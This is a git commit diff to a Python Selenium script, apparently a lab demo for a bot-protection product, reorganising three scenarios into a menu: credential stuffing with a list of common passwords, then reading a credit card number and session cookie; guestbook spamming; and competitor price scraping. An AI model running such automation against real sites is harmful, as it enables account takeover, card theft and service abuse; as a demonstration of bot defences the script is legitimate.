0e848fa2a08ee67688b509ea830eedc75c7183fc
Chmielewski Bartosz <bartosz@spm.pl>
2026-03-06 16:47:00 +0100

    ABP Script fixes

--- lababpdemo.py
+++ lababpdemo.py
@@ -13,6 +13,9 @@ from selenium.webdriver.firefox.options import Options as FirefoxOptions
 from selenium.webdriver.chrome.options import Options as ChromeOptions
 import time
 from selenium.webdriver.support.ui import Select
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
 
 ccounter = 0
@@ -34,15 +37,133 @@ def cclogin(login, password, delay=False):
     if delay: time.sleep(1)
 
 def sendspam(delay, text):
-    inputform = browser.find_element('id', 'message')
-    if delay == 1: time.sleep(2)
+    wait = WebDriverWait(browser, 10)
+
+    inputform = wait.until(EC.presence_of_element_located((By.ID, "message")))
+
+    if delay == 1:
+        time.sleep(2)
+
     print("Sending:", text)
-    if delay == 1: time.sleep(1)
+
     inputform.clear()
     inputform.send_keys(text)
-    if delay == 1: time.sleep(1)
-    browser.find_element('id', "submitEntry").click()
-    if delay == 1: time.sleep(2)
+
+    # wait until the text is actually in the field
+    wait.until(lambda d: inputform.get_attribute("value") == text)
+
+    browser.find_element(By.ID, "submitEntry").click()
+
+    if delay == 1:
+        time.sleep(2)
+
+
+def attack_credentialstuffing():
+    print("Running code for option 1")
+    print("\n\n===CREDENTIAL CRACKING USE CASE===")
+
+    print("Browsing to Login Website...")
+    time.sleep(2)
+    browser.find_element("id", "loginlink").click()
+
+    print("Looks good. I see username and password fields!\n")
+
+
+    cclogin('test1', 'test2', True)
+    cclogin('john', 'smith', True)
+    cclogin('stolenusername', 'stolenpassowrd')
+    cclogin('username', 'easypassword')
+    cclogin('user', 'Password')
+    cclogin('testuser', 'testPassword')
+    cclogin('imperva', 'imperva')
+    cclogin('john', 'abc123')
+    cclogin('admin', 'admin')
+    cclogin('root', 'default')
+    cclogin('secretuser', 'MyPetsName')
+    cclogin('chuck', 'norris')
+    cclogin('bartoszch', 'Test123123#')
+
+
+    print("\n!!! I AM IN! Account hacked !!!")
+    time.sleep(1)
+
+    browser.get(url + "accountinfo")
+
+    time.sleep(1)
+    browser.find_element("id", "RefreshData").click()
+    time.sleep(1)
+    ccnumber = browser.find_element('id', 'accountinfo_cc_number')
+    print("The Credit Card number is:", ccnumber.text)
+    time.sleep(1)
+    cookies = browser.get_cookies()
+    print('The session ID is:', cookies[0]['value'])
+
+    input("\nHit Enter when you are ready to move on!")
+
+
+def attack_guestbook_spamming():
+    print("\n\n===SPAMMING USE CASE===")
+    print("Lets now send some spam...")
+
+    browser.get(url + "guestbook")
+
+    sendspam(1, 'This is a spam example [dfghgdfasgtndsdvxvzasdfasfdxz]')
+    sendspam(1, 'This is another spam example [sgfashgfkshdfjhsfksahskh]')
+    sendspam(0, 'SPAM: askjhfaskhfxzbewhrkhsgsahwgheagfdasafasgfas')
+    sendspam(0, 'SPAM: askhgsghfjsdgfergtyuhfergfvdshagfjsgfzjcgsj')
+    sendspam(0, 'SPAM: tiundkgbskbfhjsabfjsdbsafjkbvdfjvfjvjvsadjv')
+    sendspam(0, 'SPAM: rtgbishfisgfagsfkgfjsgdhjgfsjgfajegfjsfsauf')
+    sendspam(0, 'SPAM: sghhgdhjsgfjshabgfhjbgjhgwajhfgajsfjshjzgfj')
+    sendspam(0, 'SPAM: tguyhgbhdjshgsjfghjsgjhdfzjsghfjsgjshgfsjhg')
+    sendspam(0, 'SPAM: asgfdsffdkghdskjndfkjghkhkuhzgfkuasukfhkusz')
+    sendspam(0, 'SPAM: yhilregnjdlhgkushfgskuhkudhfkaushfkaushfkus')
+    sendspam(0, 'SPAM: cnycksufhkashkasdbfyjgtkshurtishgkaushfkaus')
+    sendspam(0, 'SPAM: kjkgjdkugfakhfskfbyshkdusghfkahsgkaushfskdf')
+
+    time.sleep(1)
+
+    print("Done! I've sent some spam. I feel good now!")
+    input("\nHit Enter when you are ready to move on!")
+
+def attack_scraping():
+    print("\n\n===SCRAPING USE CASE===")
+    print("Lets see what are the prices today...\n")
+
+    browser.get(url + "webshop")
+
+    time.sleep(1)
+
+    select_element = browser.find_element("id", "categorySelect")
+    dropdown = Select(select_element)
+    options = dropdown.options
+
+    for option in options[1:4]:
+        print(f"Product category selected: {option.text}\n")
+        time.sleep(1)
+        dropdown.select_by_visible_text(option.text)
+        
+        buttons = browser.find_elements(By.CSS_SELECTOR, "button.getPriceBtn")
+
+        for button in buttons:
+            button_id = button.get_attribute("id")   # e.g. getPriceBtn-21
+            num = button_id.split("-")[1]             # 21
+
+            button.click()
+            time.sleep(0.1)
+            
+            price = browser.find_element(By.ID, f"pricefield-{num}").text
+            description = browser.find_element(By.ID, f"producttitle-{num}").text
+            print(f"Product ID: {num};  Price: {price}; Title: {description}")
+            
+        print("\n\n")
+        time.sleep(1)
+
+
+    time.sleep(1)
+
+
+    time.sleep(2)
+    print("\nDone! Now I can update my prices to be a little lower then the competition :)")
 
 
 
@@ -88,108 +209,27 @@ browser.get(url)
 time.sleep(2)
 
 
-#######################################
-##### CREDENTIAL CRACKING USE-CASE
-#######################################
+while True:
+    print("\nSelect an option:")
+    print("1 - Credential Stuffing")
+    print("2 - GuestBook Spamming")
+    print("3 - Scraping")
+    print("0 - Exit")
 
-print("\n\n===CREDENTIAL CRACKING USE CASE===")
+    choice = input("\nEnter your choice: ")
 
-print("Browsing to Login Website...")
-time.sleep(2)
-browser.find_element("id", "loginlink").click()
+    if choice == "1":
+        attack_credentialstuffing()
 
-print("Looks good. I see username and password fields!\n")
+    elif choice == "2":
+        attack_guestbook_spamming()
 
+    elif choice == "3":
+        attack_scraping()
 
-cclogin('test1', 'test2', True)
-cclogin('john', 'smith', True)
-cclogin('stolenusername', 'stolenpassowrd')
-cclogin('username', 'easypassword')
-cclogin('user', 'Password')
-cclogin('testuser', 'testPassword')
-cclogin('imperva', 'imperva')
-cclogin('john', 'abc123')
-cclogin('admin', 'admin')
-cclogin('root', 'default')
-cclogin('secretuser', 'MyPetsName')
-cclogin('chuck', 'norris')
-cclogin('bartoszch', 'Test123123#')
+    elif choice == "0":
+        print("Thank You!")
+        break
 
-
-print("\n!!! I AM IN! Account hacked !!!")
-time.sleep(1)
-
-browser.get(url + "accountinfo")
-
-time.sleep(1)
-browser.find_element("id", "RefreshData").click()
-time.sleep(1)
-ccnumber = browser.find_element('id', 'accountinfo_cc_number')
-print("The Credit Card number is:", ccnumber.text)
-time.sleep(1)
-cookies = browser.get_cookies()
-print('The session ID is:', cookies[0]['value'])
-
-input("\nHit Enter when you are ready to move on!")
-
-#######################################
-##### SPAMMING USE-CASE
-#######################################
-
-print("\n\n===SPAMMING USE CASE===")
-print("Lets now send some spam...")
-
-browser.get(url + "guestbook")
-
-sendspam(1, 'This is a spam example [dfghgdfasgtndsdvxvzasdfasfdxz]')
-sendspam(1, 'This is another spam example [sgfashgfkshdfjhsfksahskh]')
-sendspam(0, 'SPAM: askjhfaskhfxzbewhrkhsgsahwgheagfdasafasgfas')
-sendspam(0, 'SPAM: askhgsghfjsdgfergtyuhfergfvdshagfjsgfzjcgsj')
-sendspam(0, 'SPAM: tiundkgbskbfhjsabfjsdbsafjkbvdfjvfjvjvsadjv')
-sendspam(0, 'SPAM: rtgbishfisgfagsfkgfjsgdhjgfsjgfajegfjsfsauf')
-sendspam(0, 'SPAM: sghhgdhjsgfjshabgfhjbgjhgwajhfgajsfjshjzgfj')
-sendspam(0, 'SPAM: tguyhgbhdjshgsjfghjsgjhdfzjsghfjsgjshgfsjhg')
-sendspam(0, 'SPAM: asgfdsffdkghdskjndfkjghkhkuhzgfkuasukfhkusz')
-sendspam(0, 'SPAM: yhilregnjdlhgkushfgskuhkudhfkaushfkaushfkus')
-sendspam(0, 'SPAM: cnycksufhkashkasdbfyjgtkshurtishgkaushfkaus')
-sendspam(0, 'SPAM: kjkgjdkugfakhfskfbyshkdusghfkahsgkaushfskdf')
-
-time.sleep(1)
-
-print("Done! I've sent some spam. I feel good now!")
-input("\nHit Enter when you are ready to move on!")
-
-
-#######################################
-##### SCRAPING USE-CASE
-#######################################
-print("\n\n===SCRAPING USE CASE===")
-print("Lets see what are the prices today...\n")
-
-browser.get(url + "webshop")
-
-time.sleep(1)
-
-select_element = browser.find_element("id", "categorySelect")
-dropdown = Select(select_element)
-dropdown.select_by_visible_text("Electronics")
-
-time.sleep(2)
-
-browser.find_element("id", "getPriceBtn-1").click()
-ItemSamsung = browser.find_element('id', 'pricefield-1')
-print("Samsung Galaxy S25 price.", ItemSamsung.text)
-
-time.sleep(1)
-
-browser.find_element("id", "getPriceBtn-2").click()
-ItemLenovo = browser.find_element('id', 'pricefield-2')
-print("Apple iPhone 15 .", ItemLenovo.text)
-
-time.sleep(2)
-print("\nDone! Now I can update my prices to be a little lower then the competition :)")
-
-
-
-input("\n\nI am done. Press Enter to continue...")
-
+    else:
+        print("Invalid choice. Please select 0–3.")
